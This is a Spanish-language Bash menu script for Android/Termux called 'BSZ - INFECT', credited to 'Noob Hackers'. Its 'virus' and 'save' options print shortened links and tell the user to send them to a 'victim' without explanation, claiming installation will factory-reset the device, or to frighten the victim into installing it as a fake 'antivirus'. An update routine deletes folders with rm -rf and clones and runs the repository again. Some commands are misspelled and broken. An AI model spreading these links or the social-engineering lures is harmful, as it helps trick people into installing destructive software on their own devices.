red="\e[91m"
rset="\e[0m"
grn="\e[92m"
ylo="\e[93m"
blue="\e[94m"
cyan="\e[96m"
pink="\e[95m"
#-----------------
# scripting start
banner(){
vid
echo -e '\e[93m               
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠚⢁⢼⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠞⢁⣼⡯⠋⠀⠀⢀⣀⠀⠀⠀⠤⣤⣄⣀⡀⠀⣀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣎⣠⡾⢋⡝⣀⠔⠚⠉⠁⠀⠀⠉⠉⠉⠉⠉⠁⠀⠉⠙⠛⠶⢤⣀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠾⠛⡷⠊⢀⣼⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⡆⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡴⠚⠁⣠⣾⣥⡶⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢦
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⡯⠖⣲⣯⣥⣾⡟⠀⠀⠀⠀⡤⠀⢠⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠞⢋⡡⠔⢊⣥⡿⠛⡉⡽⢁⣾⣆⢠⡇⠀⢸⣿⣿⣷⣶⣶⣶⣿⡆⠀⠀⠀⠀⣀⣀⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⠋⢹⡿⡅⢀⠴⢋⣼⢀⠎⣠⣧⣾⣿⣿⠉⠀⠀⣿⣿⣿⣿⣿⣯⡠⠾⠷⠶⣦⣤⣸⣏⡀⠈⣇⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡠⠊⠀⡴⠋⢀⣽⣁⡴⠋⢈⠏⢠⣿⣿⣿⡿⠃⠀⠀⠀⠈⠹⠟⠋⠉⠁⠀⠀⠀⠀⠀⠹⣤⠙⣧⠀⠈⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⡞⠀⣠⠞⠶⡾⠋⠁⢉⡤⠒⠁⠀⡸⢿⣤⠻⣿⣦⡀⠀⣴⣶⠤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⠏⠀⠀⠀⠀⠀⠀
⠀⠀⠀⡀⠀⡠⢿⣡⣶⣋⣠⠞⠡⡔⠊⠁⠀⠀⠀⣼⠇⠈⢲⣿⣿⡿⣿⣶⠏⠉⠀⠀⠀⠀⠀⣀⣴⣶⣾⢻⣿⣿⣿⣤⣀⠀⠀⠀⠀⠀
⠀⢠⠏⠉⠾⢄⣀⣿⡛⢪⡡⠤⠖⠃⠀⠀⠀⠀⠐⢿⠀⠀⠀⠘⠸⠟⠚⠉⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⠇⠸⠿⣻⣿⣿⣿⣿⡀⠀⠀⠀
⣠⢿⠀⠀⢀⣴⡏⠁⡹⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠢⣤⣶⠀⠀⠀⠀⠀⡄⢠⠀⡀⠀⢸⣿⣿⡿⠉⠀⠀⢠⣿⣿⣿⠏⢹⠁⠀⠀⠀
⣡⠏⢀⡴⠋⡽⢂⠞⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⢁⠀⣇⣸⣶⡷⢼⣴⢿⣤⣾⣿⣿⠁⠀⠀⢀⣽⣿⣿⡇⠀⠀⠀⠀⢀⣰
⢃⣴⠏⢀⡜⣠⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⡾⡏⠹⢨⠅⠧⠰⠃⠈⠻⠿⠛⠁⠀⣠⠖⠉⣿⣿⡟⢳⣶⣾⠿⠟⠛⠁
⠟⠁⣠⣿⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⡇⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡜⠁⢀⣴⣿⡿⠃⢀⡇⠀⠀⠀⠀⠀
⢔⣾⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⠁⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣠⣴⣿⡿⠿⠟⠛⣿⣯⠭⢄⣀⣀⠀⠀⠀
⡾⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⡇⠀⠀⢀⣠⣴⠶⠾⠿⣿⣿⡿⠁⠀⠀⣀⠠⢬⠥⢤⣀⣀⡠⠬⠟⠂⠀
⠕⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠀⠀⠀⠀⢠⣟⣣⣀⡴⠋⠉⠉⣽⠦⣄⡀⢀⣀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠉⠀⣸⡄⢀⣰⣾⠿⣤⡾⠋⠀⠤⠟⠂⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣷⣤⡜⠢⢤⣀⠈⠛⣻⠉⢩⣿⣿⣟⣀⣤⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠴⣴⣖⣶⡚⠉⠻⠷⣤⠔⠂⣸⠮⠳⣄⠀⠈⠑⣶⣿⠗⠚⠛⣋⣠⡌⠉⠙⢿⠆⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠤⣾⣿⣿⣿⠛⢿⣦⡈⠁⠀⣾⡁⠀⠀⠈⠳⣤⣄⢸⣁⣀⡴⠚⠹⣶⢤⣄⡀⣀⣹⣤⠤⠤
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⢸⡉⠂⢸⣈⢣⣠⣀⠈⢻⣏⠉⠓⠲⠦⣄⡀⣏⠉⠀⣤⡀⣀⣨⠿⠛⠛⠛⠲⠤⢄
                          BSZ - INFECT
'
echo " " 
echo -e "$red                       ▶Autor : $grn AvaStr$red◀$rset"
echo -e "$red                     
           ⫸$ylo  BSZ$red ⫷$rset"
echo 
# Functions
echo -e "$red                    [Seleciona Una Opcion]$rset"
echo " "
echo " "
}
baner1(){
clear
echo -e "$red                       ▶Coded by$grn NITRO $red◀$rset"
echo -e "$red                      ⫸$ylo  Noob Hackers$red ⫷$rset"
echo 
# Functions
echo -e "$red                    [Seleciona Una Opcion]$rset"
echo " "
echo " "
}
menu(){
echo -e "$grn             ＞＞＞＞>>>＞$ylo [Opciones]$grn ＜<<<＜＜＜＜$rset"
echo " "
echo " "
echo -e "$red                        ➡$cyan [\e[92m1\e[96m] Genera Url Nuevo"
echo -e "$red                        ➡$cyan [\e[92m2\e[96m] Guarda Url"
echo -e "$red                        ➡$cyan [\e[92m3\e[96m] Informacion"
echo -e "$red                        ➡$cyan [\e[92m4\e[96m] Actualizar El Script "
echo -e "$red                        ➡$cyan [\e[92m5\e[96m] Regitrate"
echo -e "$red                        ➡$cyan [\e[92m6\e[96m] App"
echo -e "$red                        ➡$cyan [\e[92m7\e[96m] Telegram"
echo -e "$red                        ➡$cyan [\e[92m8\e[96m] Salir Del Script"
echo " "
echo " "
echo -e "$grn               >＞＞＞＞＞$ylo [SELECIONA]$grn ＜＜＜＜＜<$rset"
echo " "
echo -ne "\e[92m#SELECIONA UNA OPCION\e[92m: "
read optnz
if [ $optnz = "1" ];
then
virus
elif [ $optnz = "2" ];
then
save
elif [ $optnz = "3" ];
then
about
elif [ $optnz = "4" ];
then
upd
elif [ $optnz = "5" ];
then
am start -a android.intent.action.VIEW -d https://bitly.com/nhytchannel > /dev/null 2>&1
banner
menu
elif [ $optnz = "6" ];
then
am start -a android.intent.action.VIEW -d https://appbsz.crearforo.net/h1-indice > /dev/null 2>&1
banner
menu
elif [ $optnz = "7" ];
then
am start -a android.intent.action.VIEW -d https://bit.ly/nhwhatschat > /dev/null 2>&1
banner
menu
elif [ $optnz = "8" ];
then
exit 1
else
echo "wrong"
exit
fi
}
virus(){
################
clear
echo
echo -e '\e[92m 
88""Yb .dP"Y8 8888P     88 88b 88 888888 888888  dP""b8 888888 
88__dP `Ybo."   dP      88 88Yb88 88__   88__   dP   `"   88   
88""Yb o.`Y8b  dP       88 88 Y88 88""   88""   Yb        88   
88oodP 8bodPs d8888     88 88  Y8 88     888888  YboodP   88  '
echo " "
echo -e "\e[
Copie el enlace a continuación y envíelo a su víctima y 
no le digas nada. cuando lo instale en su 
dispositivo se restablecerá de fábrica y sucederá mucho más.
                                 👇👇👇

          L1NK: - https://tinyurl.com/uppdatesnew

                                  👆👆👆
Úselo solo con fines divertidos, no para dañar a alguien 😇✌️.
Y nuestro canal no se hace responsable de ningún tipo de pérdida. 
le haces a los demás mediante este script."
echo
echo -ne "\e[92m#Type exit : "
read exitz
if [ $exitz = "exit" ];
then
banner
menu
else
banner
menu
fi
}
save(){
clear
echo
echo -e '\e[92m 
88""Yb .dP"Y8 8888P     88 88b 88 888888 888888  dP""b8 888888 
88__dP `Ybo."   dP      88 88Yb88 88__   88__   dP   `"   88   
88""Yb o.`Y8b  dP       88 88 Y88 88""   88""   Yb        88   
88oodP 8bodPs d8888     88 88  Y8 88     888888  YboodP   88  '
echo " "
echo -e "\e[93m  Copie el enlace a continuación y envíelo a su víctima y dígaselo.
que debería instalar esta aplicación o de lo contrario su 
El dispositivo no se recuperará. (Antivirus)
                     👇👇👇

         \e[92mL1NK :- \e[96mhttps://bit.ly/3fX8ljZ\e[93m

                     👆👆👆
Úselo solo con fines divertidos, no para dañar a alguien 😇✌️. 
Y nuestro canal no es responsable de ningún tipo de 
pérdida que le haces a otros por este script."
echo
echo -ne "\e[92m#Escribe exit : "
read exitz
if [ $exitz = "exit" ];
then
banner
menu
else
banner
menu
fi
}
about(){
clear
echo -e '\e[91m
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⣸⠀⣠⣄⡀⠀⣀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⢨⣿⣿⣿⣿⣿⠀⠀⢀⡰⠡⣾⣿⣿⡇⠰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⣸⣿⣿⣿⣿⣿⣆⠘⣥⣄⠀⠘⠋⠉⣴⣶⠉⢉⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠛⡯⡿⢿⣿⣿⣿⣿⣿⣦⣯⠉⢹⣿⡆⠀⠉⠉⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⡔⢸⣁⡇⢸⢸⣿⣿⣿⣿⣿⣿⠀⠀⠻⠿⠿⠷⠷⣿⣿⣿⣿⣿⣿⣿⡿⡛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⢣⣸⢸⢇⡏⣸⣿⣿⣿⣿⣿⣿⣿⠶⠤⠤⣄⠀⢀⣸⣿⣿⣿⣿⣿⣿⣿⣉⠲⢮⢿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⢿⣟⣿⣼⣿⣿⣿⣿⣿⣿⣿⠯⠭⠥⢦⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⢉⣿⠀⠈⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠉⡟⠚⡿⠿⣿⣿⣿⡿⣻⣿⠥⣤⣶⡶⢿⣭⣛⢿⣿⣿⣿⣿⣿⣿⣷⣶⡏⠀⣆⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠸⠀⡾⣷⠖⠒⡖⢿⣿⡿⠟⠛⠛⣉⡟⠛⠙⢯⠽⢿⣞⠙⡟⠛⠚⢿⣿⡿⠲⠿⢻⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⢸⠀⢸⢀⡞⣷⣈⠻⢿⣶⣶⣶⣾⣷⣄⠀⣼⣷⣿⡿⣿⢧⡀⠀⣼⣿⣷⣄⠀⢸⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⢠⡏⣸⣷⡘⠿⣷⣶⣤⣤⣤⣤⡴⢿⡄⠘⣿⣿⣶⡿⢆⣳⡄⠘⣿⣿⡇⢱⣾⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⠀⢰⣾⣷⣿⡙⢿⣶⣤⣈⣉⣉⣉⣡⣴⣾⣄⠀⢹⣶⣭⣥⣿⢿⣿⣆⠈⢿⣇⣾⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣾⣿⣿⣯⠳⣤⡉⠛⠻⠿⠿⠿⠿⠛⣡⣿⡀⠘⣮⣙⣛⣋⣼⣿⣿⣦⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡈⠛⠷⣶⣤⣤⣴⣶⠿⠛⣡⡇⠘⣮⡻⢿⣿⡿⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣤⣀⣀⣀⣤⣴⣾⣿⣿⣶⣿⣿⣷⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
'
echo -e "\e[93m Unete \e[92mNITRO" | pv-qL 10
echo -e "\e[93m a \e[92mNOOB HACKERS" | pv-qL 10
echo -e "\e[93m Nuestros grupos \e[92mGEEK\e[93m CON MUCHA EMOCIÓN" | pv-qL 10
echo -e "\e[93m De" | pv-qL 10
echo -e "\e[93m Telegram " | pv-qL 10
echo -e "\e[93m https://t.me/+sOf-gqn6SClmNDcx " | pv-qL 10

sleep 6.0
banner
menu
}
upd(){
if [ -d "$HOME/Bsz-infect" ];
then
cd $HOME
rm -rf infect
elif [ -d "$HOME/Bsz-infect" ];
then
cd $HOME
rm -rf Bsz-infect
else
echo
exit 1
fi
cd $HOME
sleep 1
echo -e "         \e[96mLA ACTUALIZACIÓN ESTÁ CONTINUANDO, ¡ESPERE UN MOMENTO...! \e[0m"
echo
printf "                     \e[96m["
# While process is running...
while git clone https://github.com/AvastrOficial/Bsz-infect 2> /dev/null; do 
    printf  "\e[92m▓▓▓▓▓▓▓▓▓▓▓▓▓\e[0m"
    sleep 1
done
printf "\e[96m]\e[0m"
echo
echo
echo
printf "\e[96mACTUALIZACIÓN EXITOSA (ÚLTIMA VERSIÓN)..!\e[0m"
sleep 2.0
cd $HOME
cd Bsz-infect
bash Bsz-infect.sh
}
vid(){
FILE=$HOME/infect/noob.noob
if [ -f "$FILE" ]; then
pop
else
echo
fi
}
pop(){
clear
eco -e "\e[96m  ╔═════════════════════════════════════════════════════════╗\ mi[0m"
echo -e "\e[96m ║ \e[93mQUIERES UNIRTE A NUESTRO FORO\e[96m VIDEO         ║\e[0m"
echo -e "\e[96m ║ ¡MIRA SELECIONA PARA IR...!                             ║\e[0m"
eco -e "\e[96m  ║                                                         ║\e[0m"
echo -e "\e[96m ║ Seleccione \e[92my\e[96m para mirar\e[96m               ║\e[0m"
echo -e "\e[96m ║ (\e[93mOR\e[96m) \e[96m                                 ║\e[0m"
echo -e "\e[96m ║ Seleccione \e[91mt\e[96m para cancelar\e[96m            ║\e[0m"
echo -e "\e[96m ║ (\e[93mOR\e[96m) \e[96m                                 ║\e[0m"
echo -e "\e[96m ║ Seleccione \e[91mz\e[96m para saltar para siempre\e[96m ║\e[0m"
eco -e "\e[96m  ╚═════════════════════════════════════════════════════════╝\ mi[0m"
echo -en "\e[32mSELECCIONAR OPCIÓN [\e[93my/\e[93mt/\e[32m\e[93mz\e[32m]: \e[0m "
read p
if [ "$p" = "y" ];
then
am start -a android.intent.action.VIEW -d https://appbsz.crearforo.net 2>/dev/null
clear
baner1
menu
elif [ "$p" = "t" ];
then
clear
baner1
menu
elif [ "$p" = "z" ];
then
cd $HOM/Bsz-infect
banner
menu
else
banner
menu
exit
fi
}
banner
menu
